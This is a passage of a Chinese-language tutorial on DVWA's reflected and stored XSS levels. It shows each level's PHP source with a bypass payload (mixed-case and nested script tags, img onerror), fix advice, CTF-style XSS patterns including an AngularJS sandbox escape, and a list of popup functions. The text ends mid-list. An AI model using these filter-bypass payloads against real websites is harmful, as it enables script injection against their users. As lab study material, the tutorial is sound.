class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;</code>过滤1次。</p><p>payload：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code><br><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>匹配<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code>字符</p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code><br><code>&lt;iframe onload=alert(1)&gt;</code></p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars()</code>转义特殊字符（默认不转义<code>&#39;</code>，但是这里是转义的了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&amp;----&amp;amp;<br>&quot;-----&amp;quot;<br>&#x27;------&amp;apos;<br>&lt;-----&amp;lt<br>&gt;-----&amp;gt;<br></code></pre></td></tr></table></figure><p>转义后无法解析为html元素，无法xss</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存储型跟反射型的利用基本一致。但是存储型的XSS会存在数据库，弹窗会一直存在</p><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>trim</code>过滤预定义字符(<code>\t</code>、<code>\n</code>等)，<code>mysqli_real_escape_string</code>过滤<code>&#39;</code>、<code>&quot;</code>、<code>\x00</code>、<code>\n</code>等</p><p>但没怎么过滤xss语句直接插入数据库中</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;script&gt;</code></p><p>payload：</p><p><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code></p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个参数都用了<code>htmlspecialchars()</code>和<code>mysql_real_escape_string()</code> 安全</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>用户端的输入</li></ol><p>输入过滤<br>推荐白名单，不推荐黑名单，在服务端做。</p><ol start="2"><li>用户端的输出</li></ol><p>输出过滤(重点)<br>推荐HTML编码和JS转义。</p><h2 id="常见XSS题型"><a href="#常见XSS题型" class="headerlink" title="常见XSS题型"></a>常见XSS题型</h2><ol><li>无过滤</li></ol><p><code>?a=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2"><li>escape()函数过滤</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>escape(a)<br></code></pre></td></tr></table></figure><p><code>?a=&#39;;alert(1);//或?a=&#39;;alert(1);&#39;</code></p><ol start="3"><li>javascript重定向与伪链接</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">location.href</span>=a<br></code></pre></td></tr></table></figure><p><code>?a=javascript:alert(1)</code></p><ol start="4"><li>AngularJS沙箱绕过</li></ol><p>如果使用了AngularJS框架（version1.2-1.5）<br>如果payload：?a&#x3D;4传回值4，说明可能存在XSS<br>构造payload：<code>&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;</code></p><ol start="5"><li>bypass_csp</li></ol><p>参考<a href="https://xz.aliyun.com/t/9254#toc-6">https://xz.aliyun.com/t/9254#toc-6</a></p><h2 id="xss语句"><a href="#xss语句" class="headerlink" title="xss语句"></a>xss语句</h2><h3 id="弹窗函数"><a href="#弹窗函数" class="headerlink" title="弹窗函数"></a>弹窗函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">alert()<br>confirm()<br>prompt()<br></code></pre></td></tr></table></figure><h3 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 